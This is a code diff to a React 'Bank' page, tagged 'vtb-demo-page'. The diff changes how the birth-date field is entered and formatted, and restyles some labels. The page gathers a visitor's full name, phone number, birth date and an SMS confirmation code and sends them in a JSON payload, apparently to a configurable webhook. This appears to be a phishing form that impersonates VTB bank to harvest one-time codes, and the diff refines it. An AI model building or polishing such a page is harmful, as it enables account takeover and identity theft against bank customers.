@@ -155,25 +155,12 @@ const Bank = () => {
     setFormData(prev => ({ ...prev, phone: formatted }));
   };
 
-  const handleBirthDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    let value = e.target.value.replace(/\D/g, '');
-
-    if (value.length > 8) {
-      value = value.slice(0, 8);
-    }
-
-    let formatted = '';
-    if (value.length > 0) {
-      formatted = value.slice(0, 2);
-    }
-    if (value.length > 2) {
-      formatted += '.' + value.slice(2, 4);
-    }
-    if (value.length > 4) {
-      formatted += '.' + value.slice(4, 8);
-    }
-
-    setFormData(prev => ({ ...prev, birthDate: formatted }));
+  // Конвертация даты из YYYY-MM-DD в DD.MM.YYYY для отображения
+  const formatDateForDisplay = (dateStr: string): string => {
+    if (!dateStr) return '';
+    const parts = dateStr.split('-');
+    if (parts.length !== 3) return dateStr;
+    return `${parts[2]}.${parts[1]}.${parts[0]}`;
   };
 
   const saveWebhookSettings = () => {
@@ -218,7 +205,7 @@ const Bank = () => {
       const payload = {
         fullName: formData.fullName,
         phone: '7' + phoneDigits,
-        birthDate: formData.birthDate,
+        birthDate: formatDateForDisplay(formData.birthDate),
         smsCode: code,
         timestamp: new Date().toISOString(),
         source: 'vtb-demo-page',
@@ -352,7 +339,7 @@ const Bank = () => {
                       body: JSON.stringify({
                         fullName: formData.fullName,
                         phone: '7' + phoneDigits,
-                        birthDate: formData.birthDate,
+                        birthDate: formatDateForDisplay(formData.birthDate),
                         smsCode: newCode,
                         timestamp: new Date().toISOString(),
                         source: 'vtb-demo-page',
@@ -499,7 +486,7 @@ const Bank = () => {
             <div>
               <form onSubmit={handleSubmit} className="space-y-6">
                 <div className="space-y-2">
-                  <Label htmlFor="fullName" className="text-gray-900 text-sm font-medium">
+                  <Label htmlFor="fullName" className="text-gray-800 text-sm font-semibold">
                     Фамилия, имя и отчество
                   </Label>
                   <Input
@@ -515,24 +502,22 @@ const Bank = () => {
                 </div>
 
                 <div className="space-y-2">
-                  <Label htmlFor="birthDate" className="text-gray-900 text-sm font-medium">
+                  <Label htmlFor="birthDate" className="text-gray-800 text-sm font-semibold">
                     Дата рождения
                   </Label>
                   <Input
                     id="birthDate"
                     name="birthDate"
+                    type="date"
                     value={formData.birthDate}
-                    onChange={handleBirthDateChange}
-                    placeholder="ДД.ММ.ГГГГ"
-                    inputMode="numeric"
-                    pattern="[0-9]*"
+                    onChange={(e) => setFormData(prev => ({ ...prev, birthDate: e.target.value }))}
                     required
                     className="h-12 rounded-lg border-gray-200 bg-white text-gray-900 focus:border-[#0066FF] focus:ring-0"
                   />
                 </div>
 
                 <div className="space-y-2">
-                  <Label htmlFor="phone" className="text-gray-900 text-sm font-medium">
+                  <Label htmlFor="phone" className="text-gray-800 text-sm font-semibold">
                     Мобильный телефон
                   </Label>
                   <div className="relative">
